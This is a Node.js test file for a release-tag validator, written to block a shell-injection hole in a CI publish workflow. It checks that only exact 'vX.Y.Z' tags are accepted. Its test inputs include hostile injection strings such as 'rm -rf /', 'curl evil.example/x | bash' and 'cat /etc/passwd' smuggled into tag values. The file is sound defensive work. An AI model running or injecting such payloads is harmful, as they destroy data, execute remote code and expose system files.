import { test } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { isValidReleaseTag } from "../../scripts/verify-release-tag.mjs";

// v1.11.0 pre-release adversarial review, Finding 1 (CRITICAL): publish-npm.yml used to interpolate
// `${{ inputs.tag }}` directly into a Bash `run:` line, so a tag crafted with shell metacharacters
// terminated the intended assignment and ran as arbitrary commands, in a job holding
// `id-token: write` - reachable even with `dry_run: true`. This script's job is the allowlist half
// of the fix: reject anything that is not an exact "vX.Y.Z" shape, including every hostile shape a
// real injection payload would need.

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const SCRIPT = path.join(ROOT, "scripts/verify-release-tag.mjs");

// --- isValidReleaseTag: legitimate shapes ---

test("accepts a well-formed release tag", () => {
  assert.equal(isValidReleaseTag("v1.11.0"), true);
});

test("accepts a single-digit release tag", () => {
  assert.equal(isValidReleaseTag("v1.0.0"), true);
});

test("accepts a multi-digit release tag", () => {
  assert.equal(isValidReleaseTag("v10.20.300"), true);
});

// --- isValidReleaseTag: malformed but non-hostile shapes ---

test("rejects a tag with no leading v", () => {
  assert.equal(isValidReleaseTag("1.11.0"), false);
});

test("rejects a tag missing the patch component", () => {
  assert.equal(isValidReleaseTag("v1.11"), false);
});

test("rejects a tag with a pre-release suffix (not one of the four manifests' own shape)", () => {
  assert.equal(isValidReleaseTag("v1.11.0-beta.1"), false);
});

test("rejects a tag with build metadata", () => {
  assert.equal(isValidReleaseTag("v1.11.0+build.5"), false);
});

test("rejects leading whitespace", () => {
  assert.equal(isValidReleaseTag(" v1.11.0"), false);
});

test("rejects trailing whitespace", () => {
  assert.equal(isValidReleaseTag("v1.11.0 "), false);
});

test("rejects the empty string", () => {
  assert.equal(isValidReleaseTag(""), false);
});

test("rejects non-string input (null, undefined, number)", () => {
  assert.equal(isValidReleaseTag(null), false);
  assert.equal(isValidReleaseTag(undefined), false);
  assert.equal(isValidReleaseTag(1.11), false);
});

// --- isValidReleaseTag: hostile shapes (the actual injection-payload class Finding 1 named) ---

test("rejects a tag carrying a shell-breaking double quote and semicolon", () => {
  assert.equal(isValidReleaseTag('v1.11.0"; rm -rf / #'), false);
});

test("rejects a tag chaining a second command with a semicolon", () => {
  assert.equal(isValidReleaseTag("v1.11.0; curl evil.example/x | bash"), false);
});

test("rejects a tag carrying command substitution via backticks", () => {
  assert.equal(isValidReleaseTag("v1.11.0`whoami`"), false);
});

test("rejects a tag carrying command substitution via $(...)", () => {
  assert.equal(isValidReleaseTag("v1.11.0$(whoami)"), false);
});

test("rejects a tag carrying a pipe", () => {
  assert.equal(isValidReleaseTag("v1.11.0 | cat /etc/passwd"), false);
});

test("rejects a tag carrying a newline-smuggled second command", () => {
  assert.equal(isValidReleaseTag("v1.11.0\ncurl evil.example/x | bash"), false);
});

// --- CLI behavior ---

test("CLI: exits 0 and prints OK for a legitimate tag", () => {
  const r = spawnSync(process.execPath, [SCRIPT, "v1.11.0"], { encoding: "utf8" });
  assert.equal(r.status, 0);
  assert.match(r.stdout, /OK \("v1\.11\.0" matches vX\.Y\.Z\)/);
});

test("CLI: exits 1 and refuses a hostile tag, without ever echoing it back unescaped into a shell", () => {
  const hostile = 'v1.11.0"; touch /tmp/pwned #';
  const r = spawnSync(process.execPath, [SCRIPT, hostile], { encoding: "utf8" });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /is not a valid release tag/);
  assert.match(r.stderr, /Refusing to check out, build, test, or publish/);
});

test("CLI: exits 1 when no tag argument is given", () => {
  const r = spawnSync(process.execPath, [SCRIPT], { encoding: "utf8" });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /is not a valid release tag/);
});
